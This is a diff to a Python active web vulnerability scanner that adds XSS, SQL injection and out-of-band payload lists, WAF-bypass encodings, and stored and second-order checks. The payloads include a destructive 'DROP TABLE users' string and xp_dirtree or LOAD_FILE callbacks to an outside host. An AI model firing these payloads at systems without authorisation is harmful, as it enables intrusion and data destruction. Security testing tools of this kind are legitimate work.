@@ -3,18 +3,28 @@ VulnScanner — active vulnerability checks.
 Modules: XSS, SQLi, LFI, SSRF, Open Redirect, Security Headers.
 """
 
+import os
 import threading
 import time
 import re
 import hashlib
+from datetime import datetime, timezone
 from typing import Optional
 from urllib.parse import urlparse, urlencode, parse_qs, urljoin, urlunparse
 from queue import Queue
 from bs4 import BeautifulSoup
+import yaml
 
 from modules.utils import (
     make_session, safe_get, safe_post, finding, log, Colors, url_in_scope,
+    BaselineFingerprinter,
 )
+
+try:
+    from playwright.sync_api import sync_playwright
+    PLAYWRIGHT_AVAILABLE = True
+except ImportError:
+    PLAYWRIGHT_AVAILABLE = False
 
 
 # ── Payloads ──────────────────────────────────────────────────────────────────
@@ -30,17 +40,21 @@ XSS_PAYLOADS = [
     "javascript:alert(1)",
 ]
 
-SQLI_PAYLOADS = [
-    "'",
-    '"',
-    "' OR '1'='1",
-    "' OR 1=1--",
-    '" OR 1=1--',
-    "' AND SLEEP(3)--",
-    "1; DROP TABLE users--",
-    "' UNION SELECT NULL--",
-    "'; WAITFOR DELAY '0:0:3'--",
-]
+DEFAULT_XSS_PAYLOADS: dict = {
+    "reflected": XSS_PAYLOADS,
+    "polyglot": [
+        '"><svg/onload=alert(1)>',
+        "';alert(1)//",
+        '${alert(1)}',
+        ' " onfocus=alert(1) autofocus= ',
+        'expression(alert(1))',
+    ],
+    "dom": [
+        '<img src=x onerror=window.__bbh_xss=1>',
+        '"><img src=x onerror=window.__bbh_xss=1>',
+        "javascript:window.__bbh_xss=1",
+    ],
+}
 
 SQLI_ERRORS = [
     "sql syntax",
@@ -62,6 +76,28 @@ SQLI_ERRORS = [
     "pdo",
     "you have an error in your sql",
 ]
+
+DEFAULT_SQLI_PAYLOADS = {
+    "error_based": [
+        "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
+        "1; DROP TABLE users--", "' UNION SELECT NULL--",
+    ],
+    "time_based": [
+        "' AND SLEEP(5)-- -", '" AND SLEEP(5)-- -',
+        "'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
+        "' AND BENCHMARK(5000000,MD5('test'))--",
+    ],
+    "boolean_based": [
+        [" AND 1=1-- -", " AND 1=2-- -"],
+        ["' AND '1'='1", "' AND '1'='2"],
+        ["' AND 1=1--", "' AND 1=2--"],
+    ],
+    "oob": [
+        "'; exec xp_dirtree '//{oob}/test'--",
+        "' UNION SELECT LOAD_FILE(CONCAT('\\\\', '{oob}', '\\\\test'))",
+        "' OR 1=1 INTO OUTFILE '\\\\{oob}\\test'--",
+    ],
+}
 
 LFI_PAYLOADS = [
     "../../../../etc/passwd",
@@ -183,6 +219,14 @@ CLICKJACKING_SAFE_DIRECTIVES = [
 SCRIPT_BLOCK_RE = re.compile(r"<script\b[^>]*>.*?</script>", re.IGNORECASE | re.DOTALL)
 ATTRIBUTE_REFLECTION_RE = re.compile(r"<[^>]+\s[\w:-]+\s*=\s*['\"][^'\"]*(alert\(1\)|\{\{7\*7\}\}|\$\{7\*7\})", re.IGNORECASE)
 
+# WAF detection probes — generic payloads unlikely to hit real endpoints
+WAF_SQLI_PROBE = "' OR 1=1--"
+WAF_XSS_PROBE = "<script>alert(1)</script>"
+
+# Number of confirmation replays and required passes
+CONFIRM_TRIALS = 3
+CONFIRM_REQUIRED = 2
+
 
 # ── Scanner class ─────────────────────────────────────────────────────────────
 
@@ -197,7 +241,14 @@ class VulnScanner:
         self.base_url  = config.get("target", "").rstrip("/")
         self.findings  : list[dict] = []
         self._lock     = threading.Lock()
-        self.seen_fingerprints: set = set()  # Track deduplicated findings by fingerprint
+        self.seen_fingerprints: set = set()
+
+        # False-positive reduction
+        self.waf_detected = False
+        self.baselines    = BaselineFingerprinter(self.session, self.timeout)
+        self.confirm_trials   = config.get("confirm_trials", CONFIRM_TRIALS)
+        self.confirm_required = config.get("confirm_required", CONFIRM_REQUIRED)
+        self._verify_only_mode = config.get("verify_only", False)
 
     # ── Helpers ───────────────────────────────────────────────────────────
 
@@ -239,11 +290,79 @@ class VulnScanner:
                 return evidence_text.split(":", 1)[1].strip() in r.url
             if evidence_text.startswith("Redirect Location:"):
                 return evidence_text.split(":", 1)[1].strip() in header_text
-            # Some legacy checks use synthesized evidence. The second request still
-            # proves the resource is stable enough to report.
             return r.status_code < 500
         except Exception:
             return False
+
+    # ── WAF Detection ────────────────────────────────────────────────────
+
+    def _detect_waf(self) -> None:
+        """Send generic SQLi and XSS probes to the target.  If both get a
+        403/406/429 response, assume a WAF is present."""
+        target = self.config.get("target", "")
+        if not target:
+            return
+        safe_url = target.rstrip("/") + "/"
+        blocked = 0
+        for probe in (WAF_SQLI_PROBE, WAF_XSS_PROBE):
+            try:
+                r = safe_get(self.session, safe_url + "?" + urlencode({"q": probe}),
+                             self.timeout, raise_for_status=False)
+                if r and r.status_code in (403, 406, 429):
+                    blocked += 1
+            except Exception:
+                continue
+        if blocked >= 2:
+            self.waf_detected = True
+            log("[!] WAF detected — using WAF-bypass payload variants", Colors.YELLOW,
+                verbose_only=True, verbose=self.verbose)
+
+    # ── Baseline Fingerprinting ──────────────────────────────────────────
+
+    def _fingerprint_baselines(self) -> None:
+        """Record baseline responses for each unique (scheme+host+path)
+        before any payload injection begins."""
+        for url in self.recon.get("urls", []):
+            try:
+                self.baselines.fingerprint(url)
+            except Exception:
+                continue
+        log(f"[*] Fingerprinted {len(self.baselines._baselines)} baseline(s)",
+            Colors.CYAN, verbose_only=True, verbose=self.verbose)
+
+    # ── 2/3 Confirmation replay ─────────────────────────────────────────
+
+    def _confirm_n_times(self, url: str, evidence: str,
+                         method="GET", data=None) -> int:
+        """Repeat confirmation up to confirm_trials times.
+        Returns the number of successful confirmations."""
+        successes = 0
+        for _ in range(self.confirm_trials):
+            if self._confirm_finding(url, evidence, method=method, data=data):
+                successes += 1
+        return successes
+
+    def _add(self, f: dict) -> bool:
+        """Thread-safe addition of findings with deduplication by fingerprint.
+        Only accepts findings that pass the 2/3 confirmation replay."""
+        if not f:
+            return False
+        successes = self._confirm_n_times(
+            f.get("url", ""), f.get("evidence", ""),
+            method=f.get("_confirm_method", "GET"),
+            data=f.get("_confirm_data", None),
+        )
+        if successes < self.confirm_required:
+            return False
+        f["confirmed"] = successes >= self.confirm_required
+        with self._lock:
+            fingerprint = f.get('fingerprint')
+            if fingerprint and fingerprint in self.seen_fingerprints:
+                return False
+            if fingerprint:
+                self.seen_fingerprints.add(fingerprint)
+            self.findings.append(f)
+            return True
 
     def _inject_param(self, url: str, param: str, payload: str) -> str:
         """Replace a query param value with a payload."""
@@ -271,6 +390,61 @@ class VulnScanner:
 
     def _get_module_param(self, module_name, key, default=None):
         return self.config.get("module_params", {}).get(module_name, {}).get(key, default)
+
+    def _load_sqli_payloads(self) -> dict:
+        """Load SQLi payloads from external YAML, falling back to hardcoded defaults."""
+        yaml_path = os.path.join(
+            os.path.dirname(os.path.dirname(__file__)), "payloads", "sqli.yaml"
+        )
+        try:
+            with open(yaml_path, "r") as f:
+                loaded = yaml.safe_load(f)
+            if loaded and "payloads" in loaded:
+                return loaded["payloads"]
+        except (FileNotFoundError, yaml.YAMLError):
+            pass
+        return DEFAULT_SQLI_PAYLOADS
+
+    def _load_xss_payloads(self) -> dict:
+        """Load XSS payloads from external YAML, falling back to hardcoded defaults."""
+        yaml_path = os.path.join(
+            os.path.dirname(os.path.dirname(__file__)), "payloads", "xss.yaml"
+        )
+        try:
+            with open(yaml_path, "r") as f:
+                loaded = yaml.safe_load(f)
+            if loaded and "payloads" in loaded:
+                return loaded["payloads"]
+        except (FileNotFoundError, yaml.YAMLError):
+            pass
+        return DEFAULT_XSS_PAYLOADS
+
+    def _generate_waf_bypass_variants(self, payload: str) -> list[str]:
+        """Generate encoded WAF bypass variants for a given payload."""
+        variants = []
+        variants.append(payload.replace("<", "&lt;").replace(">", "&gt;"))
+        variants.append(payload.replace("<", "%253C").replace(">", "%253E"))
+        variants.append(payload.replace("<", "\\u003C").replace(">", "\\u003E"))
+        return variants
+
+    def _check_dom_xss(self, url: str, payload: str) -> Optional[str]:
+        """Use playwright to verify the payload reached a DOM sink."""
+        if not PLAYWRIGHT_AVAILABLE:
+            return None
+        try:
+            with sync_playwright() as p:
+                browser = p.chromium.launch(headless=True)
+                page = browser.new_page()
+                page.goto(url, timeout=max(self.timeout * 1000, 5000))
+                content = page.content()
+                browser.close()
+                if payload in content:
+                    return "innerHTML / document.write"
+                if "__bbh_xss" in content:
+                    return "eval / script execution"
+                return None
+        except Exception:
+            return None
 
     def _get_target_scheme(self):
         return urlparse(self.config.get("target", "")).scheme.lower()
@@ -356,32 +530,58 @@ class VulnScanner:
 
     def _record_confirmed(self, findings: list[dict], title: str, url: str, severity: str,
                           details: str, evidence: str, method="GET", data=None) -> bool:
-        """Create and append a finding only after secondary confirmation succeeds."""
-        if not self._confirm_finding(url, evidence, method=method, data=data):
-            return False
+        """Create and append a finding.  The 2/3 replay check lives in _add()."""
         f = finding(title, url, severity, details, evidence, confidence="confirmed")
-        if f and self._add(f):
+        if not f:
+            return False
+        f["_confirm_method"] = method
+        f["_confirm_data"] = data
+        if self._add(f):
             findings.append(f)
             return True
         return False
 
-    def _scan_xss_url_param(self, findings: list[dict], url: str, param: str) -> None:
-        for payload in XSS_PAYLOADS:
+    def _scan_xss_url_param(self, findings: list[dict], url: str, param: str, payloads: dict) -> None:
+        base = payloads.get("reflected", XSS_PAYLOADS)
+        polyglots = payloads.get("polyglot", [])
+        all_payloads = list(base) + polyglots
+        for payload in all_payloads:
             test_url = self._inject_param(url, param, payload)
             resp = safe_get(self.session, test_url, self.timeout)
             classified = self._classify_xss_context(payload, resp.text) if resp else None
+            if not classified:
+                for variant in self._generate_waf_bypass_variants(payload):
+                    variant_url = self._inject_param(url, param, variant)
+                    r = safe_get(self.session, variant_url, self.timeout)
+                    c = self._classify_xss_context(variant, r.text) if r else None
+                    if c:
+                        classified = c
+                        test_url = variant_url
+                        payload = variant
+                        break
             if not classified:
                 continue
             title, severity, evidence = classified
             details = f"Parameter '{param}' reflects payload in {title.lower()} context"
             if self._record_confirmed(findings, title, test_url, severity, details, evidence):
                 log(f"  [XSS] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
+                # DOM XSS confirmation via playwright
+                sink = self._check_dom_xss(test_url, evidence)
+                if sink:
+                    dom_details = f"Parameter '{param}' reaches DOM sink ({sink})"
+                    self._append_finding(findings, finding(
+                        "DOM XSS", test_url, "critical", dom_details, evidence,
+                    ))
+                    log(f"  [DOM XSS] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                 break
 
-    def _scan_xss_form_field(self, findings: list[dict], form: dict, field_name: str) -> None:
+    def _scan_xss_form_field(self, findings: list[dict], form: dict, field_name: str, payloads: dict) -> None:
         action = form.get("action", "")
         method = form.get("method", "get").upper()
-        for payload in XSS_PAYLOADS:
+        base_payloads = payloads.get("reflected", XSS_PAYLOADS)
+        polyglots = payloads.get("polyglot", [])
+        all_payloads = list(base_payloads) + polyglots
+        for payload in all_payloads:
             data = {f["name"]: f.get("value", "test") for f in form.get("fields", []) if f.get("name")}
             data[field_name] = payload
             if method == "POST":
@@ -391,6 +591,20 @@ class VulnScanner:
                 confirm_url = action + "?" + urlencode(data)
                 resp = safe_get(self.session, confirm_url, self.timeout)
             classified = self._classify_xss_context(payload, resp.text) if resp else None
+            if not classified:
+                for variant in self._generate_waf_bypass_variants(payload):
+                    d2 = dict(data)
+                    d2[field_name] = variant
+                    if method == "POST":
+                        r = safe_post(self.session, action, d2, self.timeout)
+                    else:
+                        r = safe_get(self.session, action + "?" + urlencode(d2), self.timeout)
+                    c = self._classify_xss_context(variant, r.text) if r else None
+                    if c:
+                        classified = c
+                        data = d2
+                        payload = variant
+                        break
             if not classified:
                 continue
             title, severity, evidence = classified
@@ -476,7 +690,11 @@ class VulnScanner:
         return "critical", "Sensitive file is publicly accessible"
 
     def _append_finding(self, findings: list[dict], f: Optional[dict]) -> None:
-        if f and self._add(f):
+        if not f:
+            return
+        f.setdefault("_confirm_method", "GET")
+        f.setdefault("_confirm_data", None)
+        if self._add(f):
             findings.append(f)
 
     def _scan_missing_headers(self, findings: list[dict], target: str, resp) -> None:
@@ -573,17 +791,50 @@ class VulnScanner:
 
     # ── XSS ──────────────────────────────────────────────────────────────
 
+    def _scan_xss_stored(self, findings: list[dict], payloads: dict, canaries: list[tuple[str, str, str]]) -> None:
+        """Re-crawl known URLs looking for previously injected canary payloads."""
+        if not canaries:
+            return
+        urls = self.recon.get("urls", [])
+        checked: set[str] = set()
+        for canary, source_url, source_field in canaries:
+            for url in urls:
+                if url == source_url or url in checked:
+                    continue
+                if canary in url:
+                    continue
+                resp = safe_get(self.session, url, self.timeout)
+                if resp and canary in resp.text:
+                    details = f"Canary '{canary[:50]}' injected via '{source_field}' at {source_url} found in different page ({url})"
+                    self._append_finding(findings, finding(
+                        "Stored XSS", url, "critical", details, canary[:120],
+                        confidence="probable",
+                    ))
+                    log(f"  [Stored XSS] {url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
+                    checked.add(url)
+                    break
+
     def scan_xss(self) -> list[dict]:
-        """Scan for reflected XSS and simple template injection canaries."""
-        findings = []
+        """Scan for reflected XSS, DOM XSS, stored XSS, and template injection."""
+        self._prepare_scan()
+        findings: list[dict] = []
+        payloads = self._load_xss_payloads()
+        stored_canaries: list[tuple[str, str, str]] = []
+
+        # ── URL parameter reflection ─────────────────────────────────────
         for url in self.recon.get("urls", []):
             if not self._in_scope(url):
                 continue
             try:
                 for param in parse_qs(urlparse(url).query).keys():
-                    self._scan_xss_url_param(findings, url, param)
+                    self._scan_xss_url_param(findings, url, param, payloads)
+                    # Track for second-order / stored detection
+                    for p in payloads.get("reflected", XSS_PAYLOADS)[:2]:
+                        stored_canaries.append((p, url, param))
             except Exception as e:
                 log(f"  [XSS] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
+
+        # ── Form field reflection ────────────────────────────────────────
         for form in self.recon.get("forms", []):
             try:
                 form_action = form.get("action", "")
@@ -593,16 +844,25 @@ class VulnScanner:
                     field_name = field.get("name")
                     if not field_name or field.get("type") in ("hidden", "submit", "button"):
                         continue
-                    self._scan_xss_form_field(findings, form, field_name)
+                    self._scan_xss_form_field(findings, form, field_name, payloads)
             except Exception as e:
                 log(f"  [XSS Form] Error processing form: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
+
+        # ── Stored XSS ───────────────────────────────────────────────────
+        self._scan_xss_stored(findings, payloads, stored_canaries)
+
         return self._deduplicate(findings)
 
     # ── SQLi ─────────────────────────────────────────────────────────────
 
     def scan_sqli(self) -> list[dict]:
-        """Scan for SQL injection using error, boolean, and timing signals."""
+        """Scan for SQL injection: error-based, boolean blind, time-based blind,
+        out-of-band (OOB), and second-order stubs."""
+        self._prepare_scan()
         findings = []
+        payloads = self._load_sqli_payloads()
+        injected_payloads: list[tuple[str, str]] = []
+        oob_host = self.config.get("oob_host")
 
         for url in self.recon.get("urls", []):
             if not self._in_scope(url):
@@ -612,7 +872,9 @@ class VulnScanner:
                 query = parse_qs(parsed.query, keep_blank_values=True)
                 for param, values in query.items():
                     original_value = values[0] if values else "1"
-                    for payload in SQLI_PAYLOADS:
+
+                    # ── Error-based ───────────────────────────────────────
+                    for payload in payloads.get("error_based", []):
                         test_url = self._inject_param(url, param, payload)
                         resp = safe_get(self.session, test_url, self.timeout)
                         if not resp:
@@ -625,21 +887,37 @@ class VulnScanner:
                             if self._record_confirmed(findings, "SQL Injection", test_url, "critical", details, evidence):
                                 log(f"  [SQLi] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                 break
+                        injected_payloads.append((payload, url))
 
-                    baseline = safe_get(self.session, url, self.timeout)
-                    true_url = self._inject_param(url, param, f"{original_value} AND 1=1-- -")
-                    false_url = self._inject_param(url, param, f"{original_value} AND 1=2-- -")
-                    true_resp = safe_get(self.session, true_url, self.timeout)
-                    false_resp = safe_get(self.session, false_url, self.timeout)
-                    if baseline and true_resp and false_resp:
-                        l1, l2, l3 = len(baseline.text), len(true_resp.text), len(false_resp.text)
-                        if abs(l1 - l2) <= 50 and abs(l1 - l3) > 50:
-                            evidence = true_resp.text[:120] or "HTTP 200"
-                            details = f"Parameter '{param}' changed response size for false boolean condition."
-                            if self._record_confirmed(findings, "Boolean-based SQL Injection", true_url, "critical", details, evidence):
-                                log(f"  [SQLi Bool] {true_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
+                    # ── Boolean-based blind ───────────────────────────────
+                    boolean_pairs = payloads.get("boolean_based", [])
+                    if boolean_pairs:
+                        baseline = safe_get(self.session, url, self.timeout)
+                        if baseline:
+                            baseline_hash = hashlib.md5(baseline.text.encode()).hexdigest()
+                            baseline_len = len(baseline.text)
+                            for true_cond, false_cond in boolean_pairs:
+                                true_url = self._inject_param(url, param, f"{original_value} {true_cond}")
+                                false_url = self._inject_param(url, param, f"{original_value} {false_cond}")
+                                true_resp = safe_get(self.session, true_url, self.timeout)
+                                false_resp = safe_get(self.session, false_url, self.timeout)
+                                if not (true_resp and false_resp):
+                                    continue
+                                true_hash = hashlib.md5(true_resp.text.encode()).hexdigest()
+                                false_hash = hashlib.md5(false_resp.text.encode()).hexdigest()
+                                true_len = len(true_resp.text)
+                                false_len = len(false_resp.text)
+                                true_normal = baseline_hash == true_hash or abs(baseline_len - true_len) <= 50
+                                false_diff = baseline_hash != false_hash and abs(baseline_len - false_len) > 50
+                                if true_normal and false_diff:
+                                    details = f"Parameter '{param}' shows differential response for boolean conditions."
+                                    evidence = true_resp.text[:120] or "HTTP 200"
+                                    if self._record_confirmed(findings, "Boolean-based SQL Injection", true_url, "critical", details, evidence):
+                                        log(f"  [SQLi Bool] {true_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
+                                        break
 
-                    for payload in ["' AND SLEEP(5)-- -", '" AND SLEEP(5)-- -', "1; WAITFOR DELAY '0:0:5'--"]:
+                    # ── Time-based blind ──────────────────────────────────
+                    for payload in payloads.get("time_based", []):
                         test_url = self._inject_param(url, param, payload)
                         delays = []
                         for _ in range(2):
@@ -651,10 +929,57 @@ class VulnScanner:
                             if self._record_confirmed(findings, "Blind SQL Injection (Time-based)", test_url, "critical", details, ""):
                                 log(f"  [SQLi Time] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                 break
+
+                    # ── Out-of-band (OOB) ─────────────────────────────────
+                    if oob_host:
+                        for payload in payloads.get("oob", []):
+                            formatted = payload.replace("{oob}", oob_host)
+                            test_url = self._inject_param(url, param, formatted)
+                            safe_get(self.session, test_url, self.timeout, raise_for_status=False)
+                            details = f"Parameter '{param}' sent OOB payload to {oob_host}."
+                            evidence = f"Check {oob_host} for incoming callbacks"
+                            f = finding(
+                                "SQL Injection (OOB)", test_url, "critical",
+                                details, evidence, confidence="tentative",
+                            )
+                            self._append_finding(findings, f)
+                            log(f"  [SQLi OOB] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
+                            break
             except Exception as e:
                 log(f"  [SQLi] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
 
+        # ── Second-order SQLi stub ────────────────────────────────────────
+        self._scan_sqli_second_order(findings, injected_payloads)
+
         return self._deduplicate(findings)
+
+    def _scan_sqli_second_order(self, findings: list[dict], injected: list[tuple[str, str]]) -> None:
+        """Stub: check whether SQLi payloads injected into one URL appear in
+        other page responses, indicating potential second-order injection."""
+        urls = self.recon.get("urls", [])
+        checked: set[str] = set()
+        for payload, source_url in injected:
+            if not payload or len(payload) < 4:
+                continue
+            for url in urls:
+                if url == source_url or url in checked:
+                    continue
+                if payload in url:
+                    continue
+                resp = safe_get(self.session, url, self.timeout)
+                if resp and payload in resp.text:
+                    details = (
+                        f"Payload '{payload[:60]}' injected at {source_url} "
+                        f"reflected in different page ({url})"
+                    )
+                    f = finding(
+                        "Second-Order SQL Injection (Stub)", url, "high",
+                        details, payload[:120], confidence="tentative",
+                    )
+                    self._append_finding(findings, f)
+                    log(f"  [SQLi 2nd] {url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
+                    checked.add(url)
+                    break
 
     # ── LFI ──────────────────────────────────────────────────────────────
 
@@ -702,6 +1027,7 @@ class VulnScanner:
 
     def scan_ssrf(self) -> list[dict]:
         """Scan for Server-Side Request Forgery across URL-bearing parameters."""
+        self._prepare_scan()
         findings = []
         for url in self.recon.get("urls", []):
             if not self._in_scope(url):
@@ -1230,3 +1556,58 @@ class VulnScanner:
         except Exception as e:
             log(f"  [scanner] Fatal error during scanning: {e}", Colors.RED, verbose_only=True, verbose=self.verbose)
             return self.findings
+
+    # ── Prepare: WAF detection + baseline fingerprinting ──────────────
+
+    def _prepare_scan(self) -> None:
+        """One-time preparation: detect WAF and fingerprint baselines."""
+        if hasattr(self, "_prepared") and self._prepared:
+            return
+        self._prepared = True
+        self._detect_waf()
+        self._fingerprint_baselines()
+
+    # ── Verify-only mode ──────────────────────────────────────────────
+
+    @staticmethod
+    def verify_report(report_path: str, config: dict) -> list[dict]:
+        """Load a previous JSON report and re-verify every unconfirmed
+        finding.  Returns updated findings with refreshed ``confirmed``
+        and ``last_verified`` fields."""
+        import json
+        try:
+            with open(report_path, "r") as f:
+                data = json.load(f)
+        except (FileNotFoundError, json.JSONDecodeError) as e:
+            log(f"[!] Cannot load report: {e}", Colors.RED)
+            return []
+
+        old_findings = data.get("findings", [])
+        if not old_findings:
+            log("[!] No findings to verify in report", Colors.YELLOW)
+            return []
+
+        config["verify_only"] = True
+        scanner = VulnScanner(config, data.get("recon_data", {}))
+        verified: list[dict] = []
+        log(f"[*] Verifying {len(old_findings)} finding(s) from {report_path} …",
+            Colors.CYAN)
+
+        for f in old_findings:
+            url = f.get("url", "")
+            evidence = f.get("evidence", "")
+            if not url:
+                continue
+            successes = scanner._confirm_n_times(url, evidence)
+            f["confirmed"] = successes >= scanner.confirm_required
+            f["last_verified"] = datetime.now(timezone.utc).isoformat()
+            verified.append(f)
+            label = "CONFIRMED" if f["confirmed"] else "FAILED"
+            color = Colors.GREEN if f["confirmed"] else Colors.RED
+            log(f"  [{label}] {url[:80]} {evidence[:60]}", color,
+                verbose_only=True, verbose=scanner.verbose)
+
+        n_confirmed = sum(1 for v in verified if v.get("confirmed"))
+        log(f"[+] Verify done: {n_confirmed}/{len(verified)} confirmed",
+            Colors.GREEN)
+        return verified
